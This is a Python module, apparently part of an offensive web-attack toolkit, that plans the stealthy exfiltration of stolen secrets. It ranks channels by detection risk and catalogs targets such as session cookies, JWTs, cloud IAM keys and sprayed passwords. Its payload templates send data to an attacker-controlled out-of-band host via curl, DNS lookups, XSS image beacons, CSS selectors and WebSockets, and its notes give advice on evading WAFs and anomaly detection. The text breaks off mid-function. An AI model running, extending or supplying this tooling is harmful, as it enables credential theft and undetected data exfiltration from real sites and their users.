# utils/ai_exfil_planner.py
import asyncio
import base64
import hashlib
import json
import math
import re
import time
import urllib.parse
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Optional


# ─── Enums ────────────────────────────────────────────────────────────────────

class ExfilChannel(Enum):
    HTTP_OOB          = "http_oob"
    DNS_OOB           = "dns_oob"
    SSRF_PROXY        = "ssrf_proxy"
    HEADER_REFLECTION = "header_reflection"
    CORS_READ         = "cors_read"
    XSS_BEACON        = "xss_beacon"
    REDIRECT_LEAK     = "redirect_leak"
    ERROR_REFLECTION  = "error_reflection"
    LOG_INJECTION     = "log_injection"
    TIMING_LEAK       = "timing_leak"
    WEBSOCKET_EXFIL   = "websocket_exfil"
    SMTP_INJECTION    = "smtp_injection"
    CSS_EXFIL         = "css_exfil"


class DataClass(Enum):
    SESSION_COOKIE    = "session_cookie"
    AUTH_TOKEN        = "auth_token"
    JWT               = "jwt"
    CSRF_TOKEN        = "csrf_token"
    API_KEY           = "api_key"
    PASSWORD_HASH     = "password_hash"
    PLAINTEXT_CRED    = "plaintext_cred"
    INTERNAL_URL      = "internal_url"
    CLOUD_IAM_KEY     = "cloud_iam_key"
    DATABASE_CRED     = "database_cred"
    SOURCE_CODE       = "source_code"
    CONFIG_FILE       = "config_file"
    ENV_VAR           = "env_var"
    PII               = "pii"
    INTERNAL_IP       = "internal_ip"
    SERVICE_ENDPOINT  = "service_endpoint"
    OAUTH_CODE        = "oauth_code"
    PRIVATE_KEY       = "private_key"


class NoiseLevel(Enum):
    SILENT    = "silent"
    LOW       = "low"
    MEDIUM    = "medium"
    HIGH      = "high"
    LOUD      = "loud"


class ExfilStepType(Enum):
    CAPTURE       = "capture"
    ENCODE        = "encode"
    FRAGMENT      = "fragment"
    TRANSMIT      = "transmit"
    VERIFY        = "verify"
    CLEANUP       = "cleanup"
    PIVOT         = "pivot"
    STAGE         = "stage"


class ChannelFeasibility(Enum):
    CONFIRMED     = "confirmed"
    PROBABLE      = "probable"
    POSSIBLE      = "possible"
    UNLIKELY      = "unlikely"
    INFEASIBLE    = "infeasible"


class EncodingScheme(Enum):
    BASE64        = "base64"
    HEX           = "hex"
    URL_ENCODED   = "url_encoded"
    XOR_OBFUSCATE = "xor_obfuscate"
    CHUNKED_B64   = "chunked_b64"
    DNS_LABEL     = "dns_label"
    DECIMAL_IP    = "decimal_ip"
    UNICODE_ESCAPE = "unicode_escape"
    ROT13_HEX     = "rot13_hex"
    GZIP_B64      = "gzip_b64"


# ─── Data Structures ──────────────────────────────────────────────────────────

@dataclass
class DataTarget:
    target_id: str
    data_class: DataClass
    source_module: str
    value_preview: str
    estimated_size_bytes: int
    sensitivity: float
    location_hint: str
    extraction_method: str
    requires_auth: bool
    available_now: bool


@dataclass
class ChannelProfile:
    channel: ExfilChannel
    feasibility: ChannelFeasibility
    noise_level: NoiseLevel
    detection_probability: float
    bandwidth_bytes_per_req: int
    requires_js: bool
    requires_ssrf: bool
    requires_open_redirect: bool
    latency_ms: int
    stealth_score: float
    prerequisites: list[str]
    payload_template: str
    encoding_schemes: list[EncodingScheme]
    notes: str


@dataclass
class ExfilStep:
    step_num: int
    step_type: ExfilStepType
    description: str
    target_data: Optional[DataTarget]
    channel: Optional[ExfilChannel]
    encoding: Optional[EncodingScheme]
    payload: str
    expected_response: str
    fallback: str
    noise_contribution: float
    duration_estimate_ms: int


@dataclass
class ExfilChain:
    chain_id: str
    name: str
    priority_score: float
    data_targets: list[DataTarget]
    channel: ChannelProfile
    steps: list[ExfilStep]
    total_noise: float
    total_duration_ms: int
    success_probability: float
    detection_vectors: list[str]
    mitre_techniques: list[str]
    prerequisites_met: bool
    fallback_chain_id: Optional[str]


@dataclass
class ExfilReport:
    plan_id: str
    target_url: str
    total_data_targets: int
    data_targets: list[DataTarget]
    channel_profiles: list[ChannelProfile]
    ranked_chains: list[ExfilChain]
    best_chain: Optional[ExfilChain]
    stealth_recommendation: str
    noise_budget: float
    overall_exfil_risk: str
    detection_vectors_summary: list[str]
    oob_server_placeholder: str
    duration_seconds: float


# ─── Channel Noise & Detection Profiles ───────────────────────────────────────

CHANNEL_BASE_PROFILES: dict[ExfilChannel, dict] = {
    ExfilChannel.DNS_OOB: {
        "noise_level": NoiseLevel.LOW,
        "detection_probability": 0.15,
        "bandwidth_bytes_per_req": 63,
        "requires_js": False,
        "requires_ssrf": False,
        "requires_open_redirect": False,
        "latency_ms": 80,
        "stealth_score": 0.88,
        "prerequisites": ["oob_dns_server", "dns_resolution_allowed"],
        "payload_template": "nslookup {data}.{oob_domain}",
        "encoding_schemes": [EncodingScheme.DNS_LABEL, EncodingScheme.HEX, EncodingScheme.BASE64],
        "notes": "63-byte label limit per segment, 253 total; chunk large payloads across queries; beacon timing avoids bulk anomaly",
    },
    ExfilChannel.HTTP_OOB: {
        "noise_level": NoiseLevel.MEDIUM,
        "detection_probability": 0.35,
        "bandwidth_bytes_per_req": 8192,
        "requires_js": False,
        "requires_ssrf": False,
        "requires_open_redirect": False,
        "latency_ms": 200,
        "stealth_score": 0.65,
        "prerequisites": ["oob_http_server", "outbound_http_allowed"],
        "payload_template": "curl -s https://{oob_domain}/c?d={data}",
        "encoding_schemes": [EncodingScheme.BASE64, EncodingScheme.URL_ENCODED, EncodingScheme.HEX],
        "notes": "High bandwidth; use HTTPS to avoid content inspection; randomise path and param names",
    },
    ExfilChannel.SSRF_PROXY: {
        "noise_level": NoiseLevel.LOW,
        "detection_probability": 0.20,
        "bandwidth_bytes_per_req": 4096,
        "requires_js": False,
        "requires_ssrf": True,
        "requires_open_redirect": False,
        "latency_ms": 350,
        "stealth_score": 0.80,
        "prerequisites": ["ssrf_confirmed", "outbound_ssrf_target"],
        "payload_template": "GET /?url=http://{oob_domain}/c?d={data}",
        "encoding_schemes": [EncodingScheme.URL_ENCODED, EncodingScheme.BASE64, EncodingScheme.CHUNKED_B64],
        "notes": "Uses confirmed SSRF as server-side relay; traffic originates from target server IP, bypasses client-side egress controls",
    },
    ExfilChannel.HEADER_REFLECTION: {
        "noise_level": NoiseLevel.LOW,
        "detection_probability": 0.18,
        "bandwidth_bytes_per_req": 512,
        "requires_js": False,
        "requires_ssrf": False,
        "requires_open_redirect": False,
        "latency_ms": 120,
        "stealth_score": 0.82,
        "prerequisites": ["header_injectable", "reflection_confirmed"],
        "payload_template": "X-Data: {data}",
        "encoding_schemes": [EncodingScheme.BASE64, EncodingScheme.HEX],
        "notes": "Exfil via injectable response headers; low bandwidth but zero JS, works server-side; use with SSRF or caching proxy to retrieve",
    },
    ExfilChannel.CORS_READ: {
        "noise_level": NoiseLevel.MEDIUM,
        "detection_probability": 0.30,
        "bandwidth_bytes_per_req": 65536,
        "requires_js": True,
        "requires_ssrf": False,
        "requires_open_redirect": False,
        "latency_ms": 500,
        "stealth_score": 0.60,
        "prerequisites": ["cors_exploitable", "xss_or_attacker_page"],
        "payload_template": "fetch('{target}',{{credentials:'include'}}).then(r=>r.text()).then(d=>fetch('{oob}/{encoded_data}'))",
        "encoding_schemes": [EncodingScheme.BASE64, EncodingScheme.URL_ENCODED],
        "notes": "High bandwidth; requires XSS or attacker-controlled page under trusted origin; full response body readable",
    },
    ExfilChannel.XSS_BEACON: {
        "noise_level": NoiseLevel.MEDIUM,
        "detection_probability": 0.40,
        "bandwidth_bytes_per_req": 2048,
        "requires_js": True,
        "requires_ssrf": False,
        "requires_open_redirect": False,
        "latency_ms": 300,
        "stealth_score": 0.55,
        "prerequisites": ["xss_reflected_or_stored", "victim_browser"],
        "payload_template": "<script>new Image().src='https://{oob}/{data}'</script>",
        "encoding_schemes": [EncodingScheme.BASE64, EncodingScheme.URL_ENCODED, EncodingScheme.HEX],
        "notes": "Classic cookie/token theft; image beacon avoids CORS preflight; use navigator.sendBeacon for larger payloads",
    },
    ExfilChannel.REDIRECT_LEAK: {
        "noise_level": NoiseLevel.LOW,
        "detection_probability": 0.22,
        "bandwidth_bytes_per_req": 256,
        "requires_js": False,
        "requires_ssrf": False,
        "requires_open_redirect": True,
        "latency_ms": 150,
        "stealth_score": 0.78,
        "prerequisites": ["open_redirect_confirmed"],
        "payload_template": "GET /?next=https://{oob}/?d={data}",
        "encoding_schemes": [EncodingScheme.URL_ENCODED, EncodingScheme.BASE64],
        "notes": "Leaks data in Referer header on redirect to attacker domain; low bandwidth but requires victim click",
    },
    ExfilChannel.ERROR_REFLECTION: {
        "noise_level": NoiseLevel.LOW,
        "detection_probability": 0.12,
        "bandwidth_bytes_per_req": 1024,
        "requires_js": False,
        "requires_ssrf": False,
        "requires_open_redirect": False,
        "latency_ms": 100,
        "stealth_score": 0.85,
        "prerequisites": ["error_disclosure_confirmed"],
        "payload_template": "GET /?id={payload} → 500 response body contains reflected data",
        "encoding_schemes": [EncodingScheme.URL_ENCODED, EncodingScheme.HEX],
        "notes": "Inject payload that triggers error including controlled data in response; exfil via response body content; zero egress required",
    },
    ExfilChannel.LOG_INJECTION: {
        "noise_level": NoiseLevel.SILENT,
        "detection_probability": 0.08,
        "bandwidth_bytes_per_req": 512,
        "requires_js": False,
        "requires_ssrf": False,
        "requires_open_redirect": False,
        "latency_ms": 50,
        "stealth_score": 0.92,
        "prerequisites": ["log_injection_confirmed", "log_read_access"],
        "payload_template": "User-Agent: {data_encoded}",
        "encoding_schemes": [EncodingScheme.BASE64, EncodingScheme.HEX],
        "notes": "Inject into User-Agent/X-Forwarded-For read back via path traversal or LFI to access logs; self-contained zero-egress",
    },
    ExfilChannel.TIMING_LEAK: {
        "noise_level": NoiseLevel.SILENT,
        "detection_probability": 0.05,
        "bandwidth_bytes_per_req": 1,
        "requires_js": False,
        "requires_ssrf": False,
        "requires_open_redirect": False,
        "latency_ms": 500,
        "stealth_score": 0.95,
        "prerequisites": ["timing_oracle_confirmed"],
        "payload_template": "Bit-by-bit extraction via response timing delta",
        "encoding_schemes": [EncodingScheme.DECIMAL_IP],
        "notes": "Extremely low bandwidth (~1 bit/request); ideal when all other egress blocked; impractical for large data",
    },
    ExfilChannel.CSS_EXFIL: {
        "noise_level": NoiseLevel.LOW,
        "detection_probability": 0.15,
        "bandwidth_bytes_per_req": 64,
        "requires_js": False,
        "requires_ssrf": False,
        "requires_open_redirect": False,
        "latency_ms": 300,
        "stealth_score": 0.80,
        "prerequisites": ["css_injection_confirmed", "victim_browser"],
        "payload_template": "input[value^='{char}'] { background: url('https://{oob}/{char}') }",
        "encoding_schemes": [EncodingScheme.URL_ENCODED],
        "notes": "CSS attribute selector exfil; char-by-char extraction without JS; defeats NoScript; works on input fields and meta tags",
    },
    ExfilChannel.WEBSOCKET_EXFIL: {
        "noise_level": NoiseLevel.MEDIUM,
        "detection_probability": 0.35,
        "bandwidth_bytes_per_req": 65536,
        "requires_js": True,
        "requires_ssrf": False,
        "requires_open_redirect": False,
        "latency_ms": 100,
        "stealth_score": 0.60,
        "prerequisites": ["websocket_endpoint_found", "xss_or_attacker_page"],
        "payload_template": "new WebSocket('wss://{oob}').send(btoa({data}))",
        "encoding_schemes": [EncodingScheme.BASE64, EncodingScheme.CHUNKED_B64],
        "notes": "High bandwidth, persistent channel; often bypasses HTTP-level WAF rules; requires WS endpoint or XSS",
    },
    ExfilChannel.SMTP_INJECTION: {
        "noise_level": NoiseLevel.HIGH,
        "detection_probability": 0.70,
        "bandwidth_bytes_per_req": 65536,
        "requires_js": False,
        "requires_ssrf": False,
        "requires_open_redirect": False,
        "latency_ms": 2000,
        "stealth_score": 0.30,
        "prerequisites": ["smtp_injection_confirmed", "mail_server_reachable"],
        "payload_template": "To: {oob_email}\r\nSubject: exfil\r\n\r\n{data}",
        "encoding_schemes": [EncodingScheme.BASE64, EncodingScheme.URL_ENCODED],
        "notes": "High noise, leaves mail server logs; use only when all other channels unavailable; encrypt payload",
    },
}

CHANNEL_SIGNAL_REQUIREMENTS: dict[ExfilChannel, list[str]] = {
    ExfilChannel.DNS_OOB:          ["dns_resolution_outbound"],
    ExfilChannel.HTTP_OOB:         ["http_outbound"],
    ExfilChannel.SSRF_PROXY:       ["ssrf_confirmed"],
    ExfilChannel.HEADER_REFLECTION:["header_injectable"],
    ExfilChannel.CORS_READ:        ["cors_exploitable"],
    ExfilChannel.XSS_BEACON:       ["xss_reflected"],
    ExfilChannel.REDIRECT_LEAK:    ["open_redirect_confirmed"],
    ExfilChannel.ERROR_REFLECTION: ["information_disclosed"],
    ExfilChannel.LOG_INJECTION:    ["header_injectable", "path_traversal_confirmed"],
    ExfilChannel.TIMING_LEAK:      ["timing_oracle_present"],
    ExfilChannel.CSS_EXFIL:        [],
    ExfilChannel.WEBSOCKET_EXFIL:  ["xss_reflected"],
    ExfilChannel.SMTP_INJECTION:   ["ssrf_confirmed"],
}

DATA_CLASS_SENSITIVITY: dict[DataClass, float] = {
    DataClass.CLOUD_IAM_KEY:    1.00,
    DataClass.PRIVATE_KEY:      1.00,
    DataClass.DATABASE_CRED:    0.98,
    DataClass.PLAINTEXT_CRED:   0.97,
    DataClass.AUTH_TOKEN:       0.95,
    DataClass.JWT:              0.93,
    DataClass.SESSION_COOKIE:   0.92,
    DataClass.API_KEY:          0.90,
    DataClass.PASSWORD_HASH:    0.85,
    DataClass.ENV_VAR:          0.80,
    DataClass.CONFIG_FILE:      0.78,
    DataClass.OAUTH_CODE:       0.75,
    DataClass.SOURCE_CODE:      0.70,
    DataClass.INTERNAL_URL:     0.65,
    DataClass.INTERNAL_IP:      0.62,
    DataClass.SERVICE_ENDPOINT: 0.60,
    DataClass.CSRF_TOKEN:       0.50,
    DataClass.PII:              0.88,
}

MITRE_MAP: dict[ExfilChannel, list[str]] = {
    ExfilChannel.DNS_OOB:          ["T1048.003", "T1071.004"],
    ExfilChannel.HTTP_OOB:         ["T1048.002", "T1071.001"],
    ExfilChannel.SSRF_PROXY:       ["T1090.002", "T1048"],
    ExfilChannel.HEADER_REFLECTION:["T1565.002", "T1048"],
    ExfilChannel.CORS_READ:        ["T1185", "T1539"],
    ExfilChannel.XSS_BEACON:       ["T1185", "T1539", "T1059.007"],
    ExfilChannel.REDIRECT_LEAK:    ["T1192", "T1048"],
    ExfilChannel.ERROR_REFLECTION: ["T1213", "T1083"],
    ExfilChannel.LOG_INJECTION:    ["T1565.001", "T1083"],
    ExfilChannel.TIMING_LEAK:      ["T1522", "T1110.004"],
    ExfilChannel.CSS_EXFIL:        ["T1185", "T1059"],
    ExfilChannel.WEBSOCKET_EXFIL:  ["T1071.001", "T1048"],
    ExfilChannel.SMTP_INJECTION:   ["T1048.002", "T1071.003"],
}

DETECTION_VECTORS: dict[ExfilChannel, list[str]] = {
    ExfilChannel.DNS_OOB:          ["DNS query anomaly detection", "Unusual subdomain patterns in DNS logs", "UEBA on DNS volume"],
    ExfilChannel.HTTP_OOB:         ["Egress traffic to new external domain", "WAF outbound content inspection", "Proxy logs"],
    ExfilChannel.SSRF_PROXY:       ["Server-side outbound connection logs", "IMDSv2 enforcement logs", "Network flow anomaly"],
    ExfilChannel.HEADER_REFLECTION:["Response header monitoring", "Cache poisoning detection", "Header anomaly in WAF"],
    ExfilChannel.CORS_READ:        ["CORS policy violation alerts", "CSP report-uri telemetry", "Browser DevTools network tab"],
    ExfilChannel.XSS_BEACON:       ["CSP violation report", "Image request to unknown domain", "WAF XSS rules"],
    ExfilChannel.REDIRECT_LEAK:    ["Referer header logging on target domain", "Redirect destination monitoring"],
    ExfilChannel.ERROR_REFLECTION: ["5xx rate spike", "WAF error rate monitoring"],
    ExfilChannel.LOG_INJECTION:    ["Log integrity monitoring", "LFI/path traversal detection rules"],
    ExfilChannel.TIMING_LEAK:      ["Response time anomaly baseline", "Statistical analysis (rare)"],
    ExfilChannel.CSS_EXFIL:        ["CSP style-src monitoring", "Unusual CSS load requests"],
    ExfilChannel.WEBSOCKET_EXFIL:  ["WS frame inspection", "Long-lived connection anomaly"],
    ExfilChannel.SMTP_INJECTION:   ["Mail server logs", "Outbound SMTP anomaly", "SPF/DKIM failures"],
}


# ─── Encoding Payload Builders ─────────────────────────────────────────────────

def _encode_dns_label(data: str, oob_domain: str) -> str:
    encoded = base64.b32encode(data.encode()).decode().lower().rstrip("=")
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    return ".".join(chunks[:4]) + "." + oob_domain


def _encode_base64(data: str) -> str:
    return base64.b64encode(data.encode()).decode()


def _encode_hex(data: str) -> str:
    return data.encode().hex()


def _encode_url(data: str) -> str:
    return urllib.parse.quote(data, safe="")


def _encode_chunked_b64(data: str, chunk_size: int = 32) -> list[str]:
    b64 = base64.b64encode(data.encode()).decode()
    return [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]


def _encode_xor(data: str, key: int = 0x42) -> str:
    return bytes(b ^ key for b in data.encode()).hex()


ENCODING_BUILDERS: dict[EncodingScheme, Callable] = {
    EncodingScheme.BASE64:         lambda d, **kw: _encode_base64(d),
    EncodingScheme.HEX:            lambda d, **kw: _encode_hex(d),
    EncodingScheme.URL_ENCODED:    lambda d, **kw: _encode_url(d),
    EncodingScheme.DNS_LABEL:      lambda d, **kw: _encode_dns_label(d, kw.get("oob_domain", "oob.example.com")),
    EncodingScheme.CHUNKED_B64:    lambda d, **kw: str(_encode_chunked_b64(d)),
    EncodingScheme.XOR_OBFUSCATE:  lambda d, **kw: _encode_xor(d),
    EncodingScheme.UNICODE_ESCAPE: lambda d, **kw: d.encode("unicode_escape").decode(),
    EncodingScheme.ROT13_HEX:      lambda d, **kw: _encode_hex(d.translate(str.maketrans(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
        "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"
    ))),
    EncodingScheme.DECIMAL_IP:     lambda d, **kw: str(int.from_bytes(d[:4].encode().ljust(4, b'\x00'), "big")),
    EncodingScheme.GZIP_B64:       lambda d, **kw: _gzip_b64(d),
}


def _gzip_b64(data: str) -> str:
    import gzip
    return base64.b64encode(gzip.compress(data.encode())).decode()


# ─── Data Target Extractors ───────────────────────────────────────────────────

def _extract_from_session(result: dict) -> list[DataTarget]:
    targets: list[DataTarget] = []
    for cookie_name in result.get("high_value_cookies", []):
        targets.append(DataTarget(
            target_id=f"DAT-{uuid.uuid4().hex[:6].upper()}",
            data_class=DataClass.SESSION_COOKIE,
            source_module="session_manager",
            value_preview=f"cookie:{cookie_name}",
            estimated_size_bytes=128,
            sensitivity=DATA_CLASS_SENSITIVITY[DataClass.SESSION_COOKIE],
            location_hint=f"Set-Cookie: {cookie_name}=...",
            extraction_method="cookie_jar_read",
            requires_auth=False,
            available_now=True,
        ))
    for tok in result.get("token_captures", []):
        ttype = tok.get("type", "")
        dc = DataClass.JWT if "jwt" in ttype else DataClass.AUTH_TOKEN
        targets.append(DataTarget(
            target_id=f"DAT-{uuid.uuid4().hex[:6].upper()}",
            data_class=dc,
            source_module="session_manager",
            value_preview=tok.get("value", "")[:40],
            estimated_size_bytes=len(tok.get("value", "")),
            sensitivity=DATA_CLASS_SENSITIVITY[dc],
            location_hint=tok.get("header_name") or tok.get("cookie_name") or "unknown",
            extraction_method="response_header_capture",
            requires_auth=False,
            available_now=True,
        ))
    return targets


def _extract_from_js_secrets(result: dict) -> list[DataTarget]:
    targets: list[DataTarget] = []
    for secret in result.get("secrets", []):
        stype = secret.get("secret_type", "").lower()
        if any(k in stype for k in ("iam", "aws", "gcp", "azure")):
            dc = DataClass.CLOUD_IAM_KEY
        elif any(k in stype for k in ("db", "database", "mysql", "postgres", "mongo")):
            dc = DataClass.DATABASE_CRED
        elif any(k in stype for k in ("private", "pem", "rsa", "ec")):
            dc = DataClass.PRIVATE_KEY
        elif any(k in stype for k in ("api", "key")):
            dc = DataClass.API_KEY
        elif any(k in stype for k in ("jwt", "bearer")):
            dc = DataClass.JWT
        elif any(k in stype for k in ("password", "pass", "pwd")):
            dc = DataClass.PLAINTEXT_CRED
        else:
            dc = DataClass.ENV_VAR
        targets.append(DataTarget(
            target_id=f"DAT-{uuid.uuid4().hex[:6].upper()}",
            data_class=dc,
            source_module="js_secrets",
            value_preview=secret.get("match_preview", "")[:40],
            estimated_size_bytes=len(secret.get("match_preview", "")),
            sensitivity=DATA_CLASS_SENSITIVITY.get(dc, 0.7),
            location_hint=secret.get("js_file", "client-side JS"),
            extraction_method="static_js_analysis",
            requires_auth=False,
            available_now=True,
        ))
    return targets


def _extract_from_ssrf(result: dict) -> list[DataTarget]:
    targets: list[DataTarget] = []
    for finding in result.get("findings", []):
        if finding.get("severity") in ("critical", "high"):
            payload_target = finding.get("payload_target", "")
            is_cloud = any(k in payload_target for k in ("169.254.", "metadata.google", "metadata/instance"))
            dc = DataClass.CLOUD_IAM_KEY if is_cloud else DataClass.INTERNAL_URL
            targets.append(DataTarget(
                target_id=f"DAT-{uuid.uuid4().hex[:6].upper()}",
                data_class=dc,
                source_module="ssrf_probe",
                value_preview=payload_target[:60],
                estimated_size_bytes=4096,
                sensitivity=DATA_CLASS_SENSITIVITY[dc],
                location_hint=f"SSRF via param: {finding.get('param', 'unknown')}",
                extraction_method="ssrf_server_fetch",
                requires_auth=False,
                available_now=True,
            ))
    return targets


def _extract_from_spray(result: dict) -> list[DataTarget]:
    targets: list[DataTarget] = []
    for hit in result.get("successful_logins", []):
        targets.append(DataTarget(
            target_id=f"DAT-{uuid.uuid4().hex[:6].upper()}",
            data_class=DataClass.PLAINTEXT_CRED,
            source_module="credential_spray",
            value_preview=f"{hit.get('username', '?')}:{hit.get('password', '?')}",
            estimated_size_bytes=64,
            sensitivity=DATA_CLASS_SENSITIVITY[DataClass.PLAINTEXT_CRED],
            location_hint="authentication endpoint response",
            extraction_method="spray_success_log",
            requires_auth=False,
            available_now=True,
        ))
    return targets


def _extract_from_scorer(result: dict) -> list[DataTarget]:
    targets: list[DataTarget] = []
    for finding in result.get("top_findings", []):
        vc = finding.get("vuln_class", "")
        url = finding.get("affected_url", "")
        if vc == "path_traversal" and url:
            targets.append(DataTarget(
                target_id=f"DAT-{uuid.uuid4().hex[:6].upper()}",
                data_class=DataClass.CONFIG_FILE,
                source_module="vuln_score",
                value_preview=url[:60],
                estimated_size_bytes=8192,
                sensitivity=DATA_CLASS_SENSITIVITY[DataClass.CONFIG_FILE],
                location_hint=url,
                extraction_method="path_traversal_read",
                requires_auth=False,
                available_now=False,
            ))
        if vc == "js_secret_exposure":
            targets.append(DataTarget(
                target_id=f"DAT-{uuid.uuid4().hex[:6].upper()}",
                data_class=DataClass.ENV_VAR,
                source_module="vuln_score",
                value_preview=finding.get("affected_param", "")[:40],
                estimated_size_bytes=256,
                sensitivity=DATA_CLASS_SENSITIVITY[DataClass.ENV_VAR],
                location_hint=finding.get("affected_url", ""),
                extraction_method="js_read",
                requires_auth=False,
                available_now=True,
            ))
    return targets


def _extract_from_redirect(result: dict) -> list[DataTarget]:
    targets: list[DataTarget] = []
    for finding in result.get("findings", []):
        if finding.get("type") == "open_redirect":
            targets.append(DataTarget(
                target_id=f"DAT-{uuid.uuid4().hex[:6].upper()}",
                data_class=DataClass.INTERNAL_URL,
                source_module="redirect_trace",
                value_preview=finding.get("url", "")[:60],
                estimated_size_bytes=256,
                sensitivity=DATA_CLASS_SENSITIVITY[DataClass.INTERNAL_URL],
                location_hint=f"redirect param: {finding.get('param', 'unknown')}",
                extraction_method="redirect_referer_leak",
                requires_auth=False,
                available_now=True,
            ))
    return targets


DATA_EXTRACTORS: dict[str, Callable[[dict], list[DataTarget]]] = {
    "session_manager":   _extract_from_session,
    "js_secrets":        _extract_from_js_secrets,
    "ssrf_probe":        _extract_from_ssrf,
    "credential_spray":  _extract_from_spray,
    "vuln_score":        _extract_from_scorer,
    "redirect_trace":    _extract_from_redirect,
}


# ─── Channel Feasibility Scorer ───────────────────────────────────────────────

def _score_channel_feasibility(
    channel: ExfilChannel,
    scan_signals: set[str],
    waf_present: bool,
    waf_vendor: str,
    has_oob_server: bool,
) -> ChannelFeasibility:
    required = CHANNEL_SIGNAL_REQUIREMENTS.get(channel, [])
    met = sum(1 for r in required if r in scan_signals)
    total = len(required)

    if total == 0:
        base = ChannelFeasibility.POSSIBLE
    elif met == total:
        base = ChannelFeasibility.CONFIRMED
    elif met >= total * 0.5:
        base = ChannelFeasibility.PROBABLE
    elif met > 0:
        base = ChannelFeasibility.POSSIBLE
    else:
        base = ChannelFeasibility.UNLIKELY

    if channel in (ExfilChannel.HTTP_OOB, ExfilChannel.DNS_OOB) and not has_oob_server:
        if base.value in ("confirmed", "probable"):
            base = ChannelFeasibility.POSSIBLE

    if waf_present and channel == ExfilChannel.HTTP_OOB:
        if base == ChannelFeasibility.CONFIRMED:
            base = ChannelFeasibility.PROBABLE

    return base


def _build_channel_profile(
    channel: ExfilChannel,
    scan_signals: set[str],
    waf_present: bool,
    waf_vendor: str,
    has_oob_server: bool,
) -> ChannelProfile:
    base = CHANNEL_BASE_PROFILES[channel]
    feasibility = _score_channel_feasibility(channel, scan_signals, waf_present, waf_vendor, has_oob_server)
    detection_adj = base["detection_probability"]
    if waf_present and channel in (ExfilChannel.HTTP_OOB, ExfilChannel.XSS_BEACON):
        detection_adj = min(1.0, detection_adj * 1.4)
    if channel == ExfilChannel.SSRF_PROXY and "ssrf_confirmed" in scan_signals:
        detection_adj = max(0.05, detection_adj * 0.6)
    stealth = base["stealth_score"]
    if feasibility == ChannelFeasibility.CONFIRMED:
        stealth = min(1.0, stealth * 1.05)
    elif feasibility in (ChannelFeasibility.UNLIKELY, ChannelFeasibility.INFEASIBLE):
        stealth = stealth * 0.8
    return ChannelProfile(
        channel=channel,
        feasibility=feasibility,
        noise_level=base["noise_level"],
        detection_probability=round(detection_adj, 3),
        bandwidth_bytes_per_req=base["bandwidth_bytes_per_req"],
        requires_js=base["requires_js"],
        requires_ssrf=base["requires_ssrf"],
        requires_open_redirect=base["requires_open_redirect"],
        latency_ms=base["latency_ms"],
        stealth_score=round(stealth, 3),
        prerequisites=base["prerequisites"],
        payload_template=base["payload_template"],
        encoding_schemes=base["encoding_schemes"],
        notes=base["notes"],
    )


# ─── Step Builder ─────────────────────────────────────────────────────────────

def _build_capture_step(step_num: int, target: DataTarget) -> ExfilStep:
    method_map = {
        "cookie_jar_read":       "Read session cookie from authenticated request via browser or HTTP client",
        "response_header_capture": "Intercept Authorization/Set-Cookie header from login/refresh response",
        "static_js_analysis":    "Extract hardcoded value from client-side JS file",
        "ssrf_server_fetch":     "Issue SSRF request to internal metadata/service endpoint and read response",
        "spray_success_log":     "Record credentials from successful authentication spray hit",
        "path_traversal_read":   "Read target file via directory traversal payload (../../etc/passwd pattern)",
        "redirect_referer_leak": "Trigger redirect and capture Referer header on attacker-controlled domain",
        "js_read":               "Read JS file or inline script block containing secret",
    }
    return ExfilStep(
        step_num=step_num,
        step_type=ExfilStepType.CAPTURE,
        description=method_map.get(target.extraction_method, f"Capture {target.data_class.value} from {target.source_module}"),
        target_data=target,
        channel=None,
        encoding=None,
        payload=f"# capture: {target.extraction_method} @ {target.location_hint[:80]}",
        expected_response=f"{target.data_class.value} value up to {target.estimated_size_bytes} bytes",
        fallback=f"retry with alternate endpoint if {target.location_hint} returns 403",
        noise_contribution=0.05,
        duration_estimate_ms=500,
    )


def _build_encode_step(step_num: int, target: DataTarget, channel_profile: ChannelProfile) -> ExfilStep:
    scheme = channel_profile.encoding_schemes[0] if channel_profile.encoding_schemes else EncodingScheme.BASE64
    sample = target.value_preview[:20] if target.value_preview else "SAMPLE_DATA"
    try:
        builder = ENCODING_BUILDERS.get(scheme, ENCODING_BUILDERS[EncodingScheme.BASE64])
        encoded_sample = builder(sample, oob_domain="oob.PLACEHOLDER.com")[:40]
    except Exception:
        encoded_sample = "ENCODED_SAMPLE"
    return ExfilStep(
        step_num=step_num,
        step_type=ExfilStepType.ENCODE,
        description=f"Encode captured {target.data_class.value} using {scheme.value} for {channel_profile.channel.value} channel",
        target_data=target,
        channel=channel_profile.channel,
        encoding=scheme,
        payload=f"# encode: {scheme.value}(data)\n# sample: {encoded_sample}...",
        expected_response="encoded string ready for transmission",
        fallback=f"fallback to {EncodingScheme.HEX.value} if {scheme.value} produces characters rejected by channel",
        noise_contribution=0.0,
        duration_estimate_ms=10,
    )


def _build_fragment_step(step_num: int, target: DataTarget, channel_profile: ChannelProfile) -> Optional[ExfilStep]:
    if target.estimated_size_bytes <= channel_profile.bandwidth_bytes_per_req:
        return None
    chunks = math.ceil(target.estimated_size_bytes / channel_profile.bandwidth_bytes_per_req)
    return ExfilStep(
        step_num=step_num,
        step_type=ExfilStepType.FRAGMENT,
        description=f"Fragment {target.estimated_size_bytes}B payload into {chunks} chunks of {channel_profile.bandwidth_bytes_per_req}B for {channel_profile.channel.value}",
        target_data=target,
        channel=channel_profile.channel,
        encoding=None,
        payload=f"# fragment: split encoded_data into {chunks} chunks\n# add seq_num prefix: 'chunk_{{}}_of_{chunks}_' + data_part",
        expected_response=f"{chunks} sequential transmission requests",
        fallback="increase chunk size if request rate triggers anomaly detection",
        noise_contribution=0.02 * chunks,
        duration_estimate_ms=channel_profile.latency_ms * chunks,
    )


def _build_transmit_step(step_num: int, target: DataTarget, channel_profile: ChannelProfile, oob_domain: str) -> ExfilStep:
    oob = oob_domain or "OOB_SERVER_PLACEHOLDER.com"
    template = channel_profile.payload_template
    encoded_sample = _encode_base64(target.value_preview[:20])[:20]
    payload = (template
               .replace("{oob_domain}", oob)
               .replace("{oob}", f"https://{oob}")
               .replace("{data}", encoded_sample + "...")
               .replace("{target}", target.location_hint[:60])
               .replace("{encoded_data}", encoded_sample)
               .replace("{char}", "X"))
    return ExfilStep(
        step_num=step_num,
        step_type=ExfilStepType.TRANSMIT,
